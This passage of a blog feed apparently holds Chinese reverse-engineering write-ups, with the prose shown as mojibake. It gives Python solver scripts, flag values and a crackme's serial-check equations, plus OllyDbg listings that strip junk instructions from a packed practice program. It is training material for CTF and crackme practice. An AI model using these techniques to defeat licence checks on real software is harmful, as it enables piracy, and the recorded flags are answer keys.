        [5119, 3109, 8369, 7993, 2927, 127, 5233, 4783, 5171, 3907, 1613, 4567, 3343, 2617, 5387, 8713, 7829, 3559, 419, 9931, 6067, 4481]
        ]//è¿™ä¸€ä¸ªæ•°ç»„é‡ŒåŒ…å«çš„æ˜¯æ–¹ç¨‹ç»„çš„ç³»æ•°
print len(matrix)
for i in matrix:
    if len(i)==21:
        print i
result  = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,73,99,49,49,125]
if __name__ == &apos;__main__&apos; :
       #gen_matrix()
       verify   = numpy.array(verify )
       matrix   = numpy.array(matrix )
       print numpy.linalg.solve(matrix,verify)//è§£æ–¹ç¨‹ç»„
       #print result
       for   x in xrange(len(result)):
              sys.stdout.write(chr(result[x]))
</code></pre>]]></content>
      <tags>
        <tag>python</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverseä¹‹ç¬¬ä¸‰æ›´</title>
    <url>/2017/01/19/reverse%E4%B9%8B%E7%AC%AC%E4%B8%89%E6%9B%B4/</url>
    <content><![CDATA[<p>reverseç¬¬ä¸‰æ›´<br><a id="more"></a><br>ç¨‹åºæ‰“å¼€ï¼Œå¯¹è¯æ¡†ä¸Šçš„ç¡®å®šæŒ‰é’®ä¸€ç›´æ˜¯éšè—çš„ï¼Œè¾“å…¥16ä¸ªå­—ç¬¦ä¹‹åæŒ‰é’®ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>ä½¿ç”¨ODæ‰“å¼€ç¨‹åºï¼Œæœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†ä½ èµ¢å•¦ï¼Œâ€œFlagå°±æ˜¯ä½ çš„å£ä»¤â€ã€‚</p>
<p><img src="http://p1.bqimg.com/567571/08cdef6067b2cb75.png" alt=""></p>
<p>è¿™æ®µä»£ç çš„ä¸»è¦ä½œç”¨æ˜¯åˆ¤æ–­0x00571458å†…å­˜é‡Œå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¦‚æœæ˜¯8å°±è·³è½¬åˆ°æˆåŠŸï¼Œæ‰€ä»¥åªè¦ä½¿0x00571458å­—ç¬¦ä¸²é•¿åº¦ä¸º8å°±æˆåŠŸäº†ã€‚</p>
<p>æ¥ä¸‹æ¥åœ¨0x00571458å¤„ä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼ŒåºŸäº†å¥½å¤§åŠŸå¤«ä¸‹å¥½è¿™ä¸ªæ–­ç‚¹ï¼Œç¾æ„§æ¬²æ­»å•Šï¼ï¼ï¼</p>
<p>é¦–å…ˆåœ¨æ•°æ®çª—å£è·Ÿéš</p>
<p><img src="http://i1.piimg.com/567571/4c4f1a43d29ca874.png" alt=""></p>
<p>æ¥ä¸‹æ¥è½¬åˆ°è¡¨è¾¾å¼ï¼Œ00571458ï¼Œé€‰ä¸­åœ°å€çš„æ•°æ®æ®µï¼Œåœ¨è¯¥ä½ç½®ä¸‹ç¡¬ä»¶å†™å…¥æ–­ç‚¹ã€‚<br>å†æ¬¡è¿è¡Œä¼šå‡ºç°åœ¨å¦‚ä¸‹ä½ç½®ï¼š<br><img src="http://i1.piimg.com/567571/578aad55142c8f09.png" alt=""></p>
<p>è¾“å…¥çš„16ä¸ªå­—ç¬¦ç»è¿‡004017C0()å‡½æ•°æ¯ä¸¤ä¸ªå­—ç¬¦ç»„åˆä¸ºä¸€ç»„ï¼Œä¾‹å¦‚ABCDEF1234567890å˜æˆäº†ABï¼ŒCDï¼ŒEFï¼Œ12ï¼Œ34ï¼Œ56ï¼Œ78ï¼Œ90</p>
<p><img src="http://i1.piimg.com/567571/338969cf397fd41b.png" alt=""></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾å…³é”®çš„åŠ å¯†ç®—æ³•ï¼š</p>
<p><img src="http://i1.piimg.com/567571/14beb8b431510235.png" alt=""></p>
<p>æ‰¾åˆ°sub_401B80()å‡½æ•°</p>
<pre><code>int __stdcall sub_401B80(int a1)
{
  sub_401970();
  if ( (unsigned __int8)(flag_3_ + flag_2_ + flag_1_ + flag_0_) == 71
    &amp;&amp; (unsigned __int8)(flag_7_ + flag_6_ + flag_5_) == 3
    &amp;&amp; (unsigned __int8)flag_0_ == flag_1_ + 68
    &amp;&amp; flag_1_ == (unsigned __int8)flag_2_ + 2
    &amp;&amp; (unsigned __int8)flag_2_ == (unsigned __int8)flag_3_ - 59
    &amp;&amp; (unsigned __int8)flag_6_ == (unsigned __int8)flag_4_ + 10
    &amp;&amp; (unsigned __int8)flag_6_ == (unsigned __int8)flag_7_ + 9
    &amp;&amp; (unsigned __int8)flag_4_ == flag_5_ + 52 )
  {
    JUMPOUT(__CS__, 0x1947 + 0x400000);
  }
  return 0;
}
</code></pre><p>sub_401970()å‡½æ•°æ˜¯åŠ å¯†è¿‡ç¨‹ä¹‹åå°±æ˜¯åˆ¤æ–­è¾“å…¥æ˜¯å¦æ­£ç¡®ã€‚</p>
<p>é¦–å…ˆå°†ä¸Šé¢çš„æ–¹ç¨‹ç»„è§£å‡ºæ¥ï¼Œæ–¹ç¨‹ç»„åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†è§£ï¼Œflag0ï¼Œ1ï¼Œ2ï¼Œ3ä¸€èµ·ï¼Œflag4ï¼Œ5ï¼Œ6ï¼Œ7ä¸€èµ·è§£ã€‚éœ€è¦æ³¨æ„çš„æ˜¯int8ç±»å‹</p>
<p>flag4~flag7åªæœ‰ä¸€ä¸ªè§£</p>
<pre><code>flag4=100ï¼Œflag5=48ï¼Œflag6=110ï¼Œflag7=101
</code></pre><p>flag0~flag4æœ‰ä¸‰ä¸ªè§£</p>
<pre><code>flag0=183,flag1=115,flag2=113,flag3=172
flag0=119,flag1=51,flag2=49,flag3=108
flag0=247,flag1=179,flag2=177,flag3=236
</code></pre><p>sub_401970()å‡½æ•°é‡Œæ˜¯ä¸€ä¸ªç½®æ¢è¡¨ï¼Œæ¯ä¸€ä¸ªè¾“å…¥çš„å­—ç¬¦éƒ½ä¼šç»è¿‡å››æ¬¡ç½®æ¢ï¼Œæœ€ç»ˆè¿›è¡Œåˆ¤æ–­ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ²¡è¾“å…¥ä¹‹å‰å’Œè¾“å…¥ä¹‹åç½®æ¢è¡¨æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿è¡Œä¹‹åæ˜¯æ­£ç¡®çš„ç½®æ¢è¡¨ï¼š</p>
<pre><code>0056B0D0  63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76  
0056B0E0  CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 
0056B0F0  B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15  
0056B100  04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75  
0056B110  09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84  
0056B120  53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF 
0056B130  D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8  
0056B140  51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2  
0056B150  CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73  
0056B160  60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB  
0056B170  E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79  
0056B180  E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 
0056B190  BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A  
0056B1A0  70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E 
0056B1B0  E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF
0056B1C0  8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16  
</code></pre><p><img src="http://i1.piimg.com/567571/dbc9f5f1362bf56f.png" alt=""></p>
<p>é€šè¿‡ç½®æ¢è¡¨é€†æ¨flag</p>
<pre><code>buf=[0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
        0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
        0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
        0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
        0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
        0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
        0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
        0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
        0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
        0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
        0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
        0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
        0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
        0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
        0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16]
d={}
for n,item in enumerate(buf):
    d[item]=n
#buf1=[183,115,113,172,100,48,110,101]
#buf1=[247,179,177,236,100,48,110,101]
buf1=[119,51,49,108,100,48,110,101]

flag=&apos;&apos;
for i in buf1:
    nCurrent=i
    for j in range(0,64*4):
        nCurrent=d[nCurrent]
    flag+=&quot;%02X&quot;%nCurrent
print(flag)
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverseä¹‹ç¬¬ä¹æ›´</title>
    <url>/2017/02/04/reverse%E4%B9%8B%E7%AC%AC%E4%B9%9D%E6%9B%B4/</url>
    <content><![CDATA[<p>è½¬è½½æ¥è‡ªçœ‹é›ªè®ºå›@PEdiy.com<br><a id="more"></a></p>
<p>æœ¬é¢˜å‡ºè‡ªçœ‹é›ª2016VrackMeç¬¬21ï¼Œç¨‹åºæœ‰å£³æœ‰èŠ±ï¼ŒserialéªŒè¯éƒ¨åˆ†å¾ˆå®¹æ˜“ã€‚</p>
<p>å…¥å£å‡ºå°±å¯ä»¥çœ‹å‡ºç¨‹åºè¢«åŠ äº†å£³ï¼Œä¸è¿‡è°ƒè¯•ä¹‹åå‘ç°å¾ˆç®€å•çš„ä¸€ä¸ªå£³ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥æ‰¾åˆ°OEPï¼Œæˆ‘æ˜¯ç›´æ¥å•æ­¥è°ƒè¯•ä¸‹å»ï¼Œæ‰¾åˆ°å¦‚ä¸‹è¿™ä¸ªè·³è½¬ï¼Œç›´æ¥å°±è·³è½¬åˆ°OEPäº†ã€‚</p>
<p>å£³å¯ä»¥è„±æ‰ä¹Ÿå¯ä»¥ä¸è„±å¸¦å£³è°ƒè¯•ä¹Ÿè¡Œï¼Œåœ¨è¿™ä¸ªä½ç½®ä¸‹æ–­ç‚¹ï¼Œä¹‹åå–æ¶ˆæ–­ç‚¹ï¼Œè¿è¡Œåˆ°OEPã€‚</p>
<p>æ¥ä¸‹æ¥ bp ReadFile æ–­ä¸‹ç¨‹åºåï¼Œä¸è¿œå°±èƒ½è·Ÿåˆ°å…³é”®è¿‡ç¨‹ï¼ŒèŠ±æŒ‡ä»¤å½±å“åˆ†æï¼Œæ‰‹å·¥æ¸…é™¤å¯¹ç®—æ³•åˆ†ææœ‰å¹²æ‰°çš„èŠ±æŒ‡ä»¤ï¼Œæœ‰è€å¿ƒæ…¢æ…¢çœ‹ã€‚</p>
<p>PSï¼šæœ¬é¢˜èŠ±æŒ‡ä»¤å¾ˆå¤šéƒ½æ˜¯åŸºäºå˜å½¢è·³è½¬æŒ‡ä»¤çš„ç»„åˆï¼Œå¡«å……äº†åƒåœ¾ä»£ç ï¼Œå°±åƒå¼€è½¦çš„æ—¶å€™æŒ¡é£ç»ç’ƒè¿·é›¾äº†ï¼Œæ€ä¹ˆåŠï¼Ÿå¼€é™¤é›¾æ¨¡å¼å§ã€‚</p>
<pre><code>0040369B   &gt; \68 FF444000   PUSH crackme_.004044FF                   ;  å†…å­˜è®¿é—®æ–­ç‚¹4044FF
004036A0   .  68 03000000   PUSH 0x3
004036A5   .  B8 01000000   MOV EAX,0x1
004036AA   .  BB B0634400   MOV EBX,crackme_.004463B0
004036AF   .  E8 090F0000   CALL crackme_.004045BD                   ;  åˆ›å»ºçº¿ç¨‹å­ç¨‹åº
//åˆ›å»ºçº¿ç¨‹å­ç¨‹åºï¼Œå†…å­˜è®¿é—®æ–­ç‚¹4044FFï¼Œè·Ÿè¸ªçº¿ç¨‹

004038A4    F8              CLC
004038A5    73 01           JNB Xcrackme_.004038A8
004038A7    B4 F9           MOV AH,0xF9
004038A9    72 01           JB Xcrackme_.004038AC
004038AB    0FF972 01       PSUBW MM6,QWORD PTR DS:[EDX+0x1]
004038AF    B9 B8D87346     MOV ECX,0x4673D8B8
//èŠ±æŒ‡ä»¤ F8 73 01 B4 F9 72 01 0F F9 72 01 B9 NOPæ‰


004038A4    90              NOP
004038A5    90              NOP
004038A6    90              NOP
004038A7    90              NOP
004038A8    90              NOP
004038A9    90              NOP
004038AA    90              NOP
004038AB    90              NOP
004038AC    90              NOP
004038AD    90              NOP
004038AE    90              NOP
004038AF    90              NOP
004038B0    B8 D8734600     MOV EAX,crackme_.004673D8
//å»èŠ±æŒ‡ä»¤ä¹‹å

004038D3    E8 00000000     CALL crackme_.004038D8
004038D8    830424 06       ADD DWORD PTR SS:[ESP],0x6
004038DC    C3              RETN
004038DD    B8 8B1DE840     MOV EAX,0x40E81D8B
004038E2    48              DEC EAX
004038E3    0053 E8         ADD BYTE PTR DS:[EBX-0x18],DL
004038E6    BB 0C000083     MOV EBX,0x8300000C
//èŠ±æŒ‡ä»¤ E8 00 00 00 00 83 04 24 06 C3 B8 NOPæ‰

004038D3    90              NOP
004038D4    90              NOP
004038D5    90              NOP
004038D6    90              NOP
004038D7    90              NOP
004038D8    90              NOP
004038D9    90              NOP
004038DA    90              NOP
004038DB    90              NOP
004038DC    90              NOP
004038DD    90              NOP
004038DE    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
//å»èŠ±æŒ‡ä»¤ä¹‹å

004038F3    F9              STC
004038F4    72 01           JB Xcrackme_.004038F7
004038F6    0FF873 01       PSUBB MM6,QWORD PTR DS:[EBX+0x1]
004038FA    7B E8           JPO Xcrackme_.004038E4
004038FC    0000            ADD BYTE PTR DS:[EAX],AL
004038FE    0000            ADD BYTE PTR DS:[EAX],AL
00403900    830424 06       ADD DWORD PTR SS:[ESP],0x6
00403904    C3              RETN
00403905    0F8B 1DE84048   JPO 48812128
0040390B    0033            ADD BYTE PTR DS:[EBX],DH
0040390D    C083 3B007E03 8&gt;ROL BYTE PTR DS:[EBX+0x37E003B],0x8B                       ; ç§»ä½å¸¸é‡è¶…å‡º 1..31 çš„èŒƒå›´
//èŠ±æŒ‡ä»¤ F9 72 01 0F F8 73 01 7B E8 00 00 00 00 83 04 24 06 C3 0F NOPæ‰

004038F3    90              NOP
004038F4    90              NOP
004038F5    90              NOP
004038F6    90              NOP
004038F7    90              NOP
004038F8    90              NOP
004038F9    90              NOP
004038FA    90              NOP
004038FB    90              NOP
004038FC    90              NOP
004038FD    90              NOP
004038FE    90              NOP
004038FF    90              NOP
00403900    90              NOP
00403901    90              NOP
00403902    90              NOP
00403903    90              NOP
00403904    90              NOP
00403905    90              NOP
00403906    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
0040390C    33C0            XOR EAX,EAX
0040390E    833B 00         CMP DWORD PTR DS:[EBX],0x0
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403919    F9              STC
0040391A    72 01           JB Xcrackme_.0040391D
0040391C    B7 EB           MOV BH,0xEB
0040391E    010F            ADD DWORD PTR DS:[EDI],ECX
00403920    68 04000080     PUSH 0x80000004
00403925    6A 00           PUSH 0x0
00403927    EB 01           JMP Xcrackme_.0040392A
00403929  ^ 74 A1           JE Xcrackme_.004038CC
0040392B    E0 40           LOOPDNE Xcrackme_.0040396D
0040392D    48              DEC EAX
0040392E    0085 C07505B8   ADD BYTE PTR SS:[EBP+0xB80575C0],AL
00403934    D7              XLAT BYTE PTR DS:[EBX+AL]
00403935    73 46           JNB Xcrackme_.0040397D
//èŠ±æŒ‡ä»¤ F9 72 01 B7 EB 01 0F 68 04 00 00 80 6A 00 EB 01 74 NOPæ‰

00403919    90              NOP
0040391A    90              NOP
0040391B    90              NOP
0040391C    90              NOP
0040391D    90              NOP
0040391E    90              NOP
0040391F    90              NOP
00403920    90              NOP
00403921    90              NOP
00403922    90              NOP
00403923    90              NOP
00403924    90              NOP
00403925    90              NOP
00403926    90              NOP
00403927    90              NOP
00403928    90              NOP
00403929    90              NOP
0040392A    A1 E0404800     MOV EAX,DWORD PTR DS:[0x4840E0]
0040392F    85C0            TEST EAX,EAX
00403931    75 05           JNZ Xcrackme_.00403938
//å»èŠ±æŒ‡ä»¤ä¹‹å

0040394E   /EB 01           JMP Xcrackme_.00403951
00403950   |0FE800          PSUBSB MM0,QWORD PTR DS:[EAX]
00403953    0000            ADD BYTE PTR DS:[EAX],AL
00403955    0083 042406C3   ADD BYTE PTR DS:[EBX+0xC3062404],AL
0040395B    B7 F8           MOV BH,0xF8
0040395D    73 01           JNB Xcrackme_.00403960
0040395F    848B 45F43945   TEST BYTE PTR DS:[EBX+0x4539F445],CL
00403965    F8              CLC
//èŠ±æŒ‡ä»¤ EB 01 0F E8 00 00 00 00 83 04 24 06 C3 B7 F8 73 01 84 NOPæ‰

0040394E    90              NOP
0040394F    90              NOP
00403950    90              NOP
00403951    90              NOP
00403952    90              NOP
00403953    90              NOP
00403954    90              NOP
00403955    90              NOP
00403956    90              NOP
00403957    90              NOP
00403958    90              NOP
00403959    90              NOP
0040395A    90              NOP
0040395B    90              NOP
0040395C    90              NOP
0040395D    90              NOP
0040395E    90              NOP
0040395F    90              NOP
00403960    8B45 F4         MOV EAX,DWORD PTR SS:[EBP-0xC]
00403963    3945 F8         CMP DWORD PTR SS:[EBP-0x8],EAX                             ; æ¯”è¾ƒæ³¨å†Œç ä½æ•°ä¸º14ä½
00403966    0F85 39070000   JNZ crackme_.004040A5
//å»èŠ±æŒ‡ä»¤ä¹‹å

0040396C   /EB 01           JMP Xcrackme_.0040396F
0040396E   |88EB            MOV BL,CH
00403970    010F            ADD DWORD PTR DS:[EDI],ECX
00403972    68 04000080     PUSH 0x80000004
00403977    6A 00           PUSH 0x0
00403979    EB 01           JMP Xcrackme_.0040397C
0040397B    B3 A1           MOV BL,0xA1
0040397D    E0 40           LOOPDNE Xcrackme_.004039BF
0040397F    48              DEC EAX
00403980    0085 C07505B8   ADD BYTE PTR SS:[EBP+0xB80575C0],AL
00403986    D7              XLAT BYTE PTR DS:[EBX+AL]
//èŠ±æŒ‡ä»¤ EB 01 88 EB 01 0F 68 04 00 00 80 6A 00 EB 01 B3 NOPæ‰

0040396C    90              NOP
0040396D    90              NOP
0040396E    90              NOP
0040396F    90              NOP
00403970    90              NOP
00403971    90              NOP
00403972    90              NOP
00403973    90              NOP
00403974    90              NOP
00403975    90              NOP
00403976    90              NOP
00403977    90              NOP
00403978    90              NOP
00403979    90              NOP
0040397A    90              NOP
0040397B    90              NOP
0040397C    A1 E0404800     MOV EAX,DWORD PTR DS:[0x4840E0]
00403981    85C0            TEST EAX,EAX
00403983    75 05           JNZ Xcrackme_.0040398A
00403985    B8 D7734600     MOV EAX,crackme_.004673D7
//å»èŠ±æŒ‡ä»¤ä¹‹å

0040399A    83C4 10         ADD ESP,0x10
0040399D    F8              CLC
0040399E    73 01           JNB Xcrackme_.004039A1
004039A0    70 33           JO Xcrackme_.004039D5
004039A2    C9              LEAVE
004039A3    50              PUSH EAX
004039A4    F9              STC
004039A5    72 01           JB Xcrackme_.004039A8
004039A7    BB 8D45FC8B     MOV EBX,0x8BFC458D
//èŠ±æŒ‡ä»¤ 83 C4 10 F8 73 01 70 ä»¥åŠ F9 72 01 BB NOPæ‰

0040399A    90              NOP
0040399B    90              NOP
0040399C    90              NOP
0040399D    90              NOP
0040399E    90              NOP
0040399F    90              NOP
004039A0    90              NOP
004039A1    33C9            XOR ECX,ECX
004039A3    50              PUSH EAX
004039A4    90              NOP
004039A5    90              NOP
004039A6    90              NOP
004039A7    90              NOP
004039A8    8D45 FC         LEA EAX,DWORD PTR SS:[EBP-0x4]
//å»èŠ±æŒ‡ä»¤ä¹‹å

004039BC   /EB 01           JMP Xcrackme_.004039BF
004039BE  ^|74 F9           JE Xcrackme_.004039B9
004039C0    72 01           JB Xcrackme_.004039C3
004039C2    0F6801          PUNPCKHBW MM0,QWORD PTR DS:[ECX]
004039C5    0300            ADD EAX,DWORD PTR DS:[EAX]
004039C7    806A 00 F9      SUB BYTE PTR DS:[EDX],0xF9
004039CB    72 01           JB Xcrackme_.004039CE
004039CD    BB 68010000     MOV EBX,0x168
004039D2    0068 01         ADD BYTE PTR DS:[EAX+0x1],CH
004039D5    0300            ADD EAX,DWORD PTR DS:[EAX]
004039D7    806A 00 F8      SUB BYTE PTR DS:[EDX],0xF8
//èŠ±æŒ‡ä»¤ EB 01 74 F9 72 01 0F ä»¥åŠ F9 72 01 BB NOPæ‰

004039BC    90              NOP
004039BD    90              NOP
004039BE    90              NOP
004039BF    90              NOP
004039C0    90              NOP
004039C1    90              NOP
004039C2    90              NOP
004039C3    68 01030080     PUSH 0x80000301
004039C8    6A 00           PUSH 0x0
004039CA    90              NOP
004039CB    90              NOP
004039CC    90              NOP
004039CD    90              NOP
004039CE    68 01000000     PUSH 0x1
004039D3    68 01030080     PUSH 0x80000301
004039D8    6A 00           PUSH 0x0
//å»èŠ±æŒ‡ä»¤ä¹‹å

004039DA    F8              CLC
004039DB    73 01           JNB Xcrackme_.004039DE
004039DD    0FFF            ???                                                        ; æœªçŸ¥å‘½ä»¤
004039DF  ^ 75 FC           JNZ Xcrackme_.004039DD
004039E1    68 04000080     PUSH 0x80000004
004039E6    6A 00           PUSH 0x0
004039E8    EB 01           JMP Xcrackme_.004039EB
004039EA    0FA1            POP FS                                                     ; æ®µå¯„å­˜å™¨æ›´æ”¹
004039EC    E0 40           LOOPDNE Xcrackme_.00403A2E
004039EE    48              DEC EAX
004039EF    0085 C07505B8   ADD BYTE PTR SS:[EBP+0xB80575C0],AL
//èŠ±æŒ‡ä»¤ F8 73 01 0F ä»¥åŠ EB 01 0F NOPæ‰

004039DA    90              NOP
004039DB    90              NOP
004039DC    90              NOP
004039DD    90              NOP
004039DE    FF75 FC         PUSH DWORD PTR SS:[EBP-0x4]
004039E1    68 04000080     PUSH 0x80000004
004039E6    6A 00           PUSH 0x0
004039E8    90              NOP
004039E9    90              NOP
004039EA    90              NOP
004039EB    A1 E0404800     MOV EAX,DWORD PTR DS:[0x4840E0]
004039F0    85C0            TEST EAX,EAX
004039F2    75 05           JNZ Xcrackme_.004039F9
004039F4    B8 D7734600     MOV EAX,crackme_.004673D7
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403A0F   /EB 01           JMP Xcrackme_.00403A12
00403A11   |828B 1DE84048 0&gt;OR BYTE PTR DS:[EBX+0x4840E81D],0x0
00403A18    E8 93FDFFFF     CALL crackme_.004037B0
// èŠ±æŒ‡ä»¤ EB 01 82 NOPæ‰

00403A0F    90              NOP
00403A10    90              NOP
00403A11    90              NOP
00403A12    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
00403A18    E8 93FDFFFF     CALL crackme_.004037B0
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403A1F    F8              CLC
00403A20    73 01           JNB Xcrackme_.00403A23
00403A22    0FEB01          POR MM0,QWORD PTR DS:[ECX]
00403A25    85EB            TEST EBX,EBP
00403A27    018B 8B1DE840   ADD DWORD PTR DS:[EBX+0x40E81D8B],ECX
00403A2D    48              DEC EAX
00403A2E    0033            ADD BYTE PTR DS:[EBX],DH
00403A30    C083 3B007E03 8&gt;ROL BYTE PTR DS:[EBX+0x37E003B],0x8B                       ; ç§»ä½å¸¸é‡è¶…å‡º 1..31 çš„èŒƒå›´
//èŠ±æŒ‡ä»¤ F8 73 01 0F EB 01 85 EB 01 8B NOPæ‰

00403A1F    90              NOP
00403A20    90              NOP
00403A21    90              NOP
00403A22    90              NOP
00403A23    90              NOP
00403A24    90              NOP
00403A25    90              NOP
00403A26    90              NOP
00403A27    90              NOP
00403A28    90              NOP
00403A29    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
00403A2F    33C0            XOR EAX,EAX
00403A31    833B 00         CMP DWORD PTR DS:[EBX],0x0
00403A34    7E 03           JLE Xcrackme_.00403A39
00403A36    8B43 04         MOV EAX,DWORD PTR DS:[EBX+0x4]
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403A3C   /EB 01           JMP Xcrackme_.00403A3F
00403A3E   |0FEB01          POR MM0,QWORD PTR DS:[ECX]
00403A41    8BDB            MOV EBX,EBX
00403A43    45              INC EBP
00403A44    F4              HLT                                                        ; ç‰¹æƒå‘½ä»¤
//èŠ±æŒ‡ä»¤ EB 01 0F EB 01 8B NOPæ‰

00403A3C    90              NOP
00403A3D    90              NOP
00403A3E    90              NOP
00403A3F    90              NOP
00403A40    90              NOP
00403A41    90              NOP
00403A42    DB45 F4         FILD DWORD PTR SS:[EBP-0xC]
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403A57    F8              CLC
00403A58    73 01           JNB Xcrackme_.00403A5B
00403A5A  ^ 78 E8           JS Xcrackme_.00403A44
00403A5C    0000            ADD BYTE PTR DS:[EAX],AL
00403A5E    0000            ADD BYTE PTR DS:[EAX],AL
00403A60    830424 06       ADD DWORD PTR SS:[ESP],0x6
00403A64    C3              RETN
00403A65    BE DD45DCDC     MOV ESI,0xDCDC45DD
00403A6A    05 18744600     ADD EAX,crackme_.00467418
//èŠ±æŒ‡ä»¤ F8 73 01 78 E8 00 00 00 00 83 04 24 06 C3 BE NOPæ‰

00403A57    90              NOP
00403A58    90              NOP
00403A59    90              NOP
00403A5A    90              NOP
00403A5B    90              NOP
00403A5C    90              NOP
00403A5D    90              NOP
00403A5E    90              NOP
00403A5F    90              NOP
00403A60    90              NOP
00403A61    90              NOP
00403A62    90              NOP
00403A63    90              NOP
00403A64    90              NOP
00403A65    90              NOP
00403A66    DD45 DC         FLD QWORD PTR SS:[EBP-0x24]
00403A69    DC05 18744600   FADD QWORD PTR DS:[0x467418]
00403A6F    DD5D D4         FSTP QWORD PTR SS:[EBP-0x2C]
00403A72    DD45 D4         FLD QWORD PTR SS:[EBP-0x2C]
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403A7A   /EB 01           JMP Xcrackme_.00403A7D
00403A7C   |0F4879 0D       CMOVS EDI,DWORD PTR DS:[ECX+0xD]
//èŠ±æŒ‡ä»¤ EB 01 0F NOPæ‰

00403A7A    90              NOP
00403A7B    90              NOP
00403A7C    90              NOP
00403A7D    48              DEC EAX
00403A7E    79 0D           JNS Xcrackme_.00403A8D
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403AA8    F9              STC
00403AA9    72 01           JB Xcrackme_.00403AAC
00403AAB    8F              ???                                                        ; æœªçŸ¥å‘½ä»¤
00403AAC    F8              CLC
00403AAD    73 01           JNB Xcrackme_.00403AB0
00403AAF    8268 01 01      SUB BYTE PTR DS:[EAX+0x1],0x1
00403AB3    0080 6A00F873   ADD BYTE PTR DS:[EAX+0x73F8006A],AL
//èŠ±æŒ‡ä»¤ F9 72 01 8F F8 73 01 82 NOPæ‰

00403AA8    90              NOP
00403AA9    90              NOP
00403AAA    90              NOP
00403AAB    90              NOP
00403AAC    90              NOP
00403AAD    90              NOP
00403AAE    90              NOP
00403AAF    90              NOP
00403AB0    68 01010080     PUSH 0x80000101
00403AB5    6A 00           PUSH 0x0
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403AB7    F8              CLC
00403AB8    73 01           JNB Xcrackme_.00403ABB
00403ABA  ^ 74 8B           JE Xcrackme_.00403A47
00403ABC    5D              POP EBP
00403ABD    D08A 03506801   ROR BYTE PTR DS:[EDX+0x1685003],1
